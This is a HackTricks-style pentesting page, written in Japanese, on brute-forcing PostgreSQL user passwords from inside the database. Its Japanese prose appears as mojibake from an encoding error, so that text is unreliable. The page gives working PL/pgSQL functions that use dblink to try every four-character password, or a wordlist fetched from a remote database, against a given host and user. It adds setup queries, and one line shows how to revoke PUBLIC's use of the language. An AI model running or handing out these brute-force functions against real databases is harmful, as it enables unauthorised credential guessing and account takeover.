# PL/pgSQL ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„!
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

**[å…ƒã®è«–æ–‡ã§ã“ã‚Œã‚‰ã®æ”»æ’ƒã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**ã€‚

PL/pgSQLã¯ã€**å¼·åŒ–ã•ã‚ŒãŸæ‰‹ç¶šãåˆ¶å¾¡**ã‚’æä¾›ã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€SQLã®æ©Ÿèƒ½ã‚’è¶…ãˆãŸ**å®Œå…¨ãªãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èª**ã§ã™ã€‚ã“ã‚Œã«ã¯ã€ãƒ«ãƒ¼ãƒ—ã‚„ã•ã¾ã–ã¾ãªåˆ¶å¾¡æ§‹é€ ã®åˆ©ç”¨ãŒå«ã¾ã‚Œã¾ã™ã€‚PL/pgSQLè¨€èªã§ä½œæˆã•ã‚ŒãŸé–¢æ•°ã¯ã€SQLæ–‡ã‚„ãƒˆãƒªã‚¬ãƒ¼ã«ã‚ˆã£ã¦å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ç’°å¢ƒå†…ã®æ“ä½œã®ç¯„å›²ã‚’åºƒã’ã¾ã™ã€‚

ã“ã®è¨€èªã‚’æ‚ªç”¨ã—ã¦ã€PostgreSQLã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å­˜åœ¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å­˜åœ¨ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™:
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+---------
plpgsql |
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**é–¢æ•°ã®ä½œæˆã¯PUBLICã«ä»˜ä¸ã•ã‚ŒãŸç‰¹æ¨©ã§ã™**ã€‚ã“ã“ã§PUBLICã¯ã€ãã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æŒ‡ã—ã¾ã™ã€‚ã“ã‚Œã‚’é˜²ããŸã‚ã«ã€ç®¡ç†è€…ã¯PUBLICãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰USAGEç‰¹æ¨©ã‚’å–ã‚Šæ¶ˆã™å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸï¼š
```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```
ãã®å ´åˆã€ä»¥å‰ã®ã‚¯ã‚¨ãƒªã¯ç•°ãªã‚‹çµæœã‚’å‡ºåŠ›ã—ã¾ã™ï¼š
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+-----------------
plpgsql | {admin=U/admin}
```
ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€**`dblink`é–¢æ•°ãŒå­˜åœ¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚å­˜åœ¨ã—ãªã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ä½œæˆã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
CREATE EXTENSION dblink;
```
## ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ã“ã“ã§ã¯ã€4æ–‡å­—ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¾ã™:
```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
word TEXT;
BEGIN
FOR a IN 65..122 LOOP
FOR b IN 65..122 LOOP
FOR c IN 65..122 LOOP
FOR d IN 65..122 LOOP
BEGIN
word := chr(a) || chr(b) || chr(c) || chr(d);
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;
EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection
THEN
-- do nothing
END;
END LOOP;
END LOOP;
END LOOP;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
_Note that even brute-forcing 4 characters may take several minutes._

ã‚ãªãŸã¯ã¾ãŸ**å˜èªãƒªã‚¹ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ã€ãã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ã¿ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ï¼ˆè¾æ›¸æ”»æ’ƒï¼‰ï¼š
```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
FOR word IN (SELECT word FROM dblink('host=1.2.3.4
user=name
password=qwerty
dbname=wordlists',
'SELECT word FROM wordlist')
RETURNS (word TEXT)) LOOP
BEGIN
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;

EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection THEN
-- do nothing
END;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
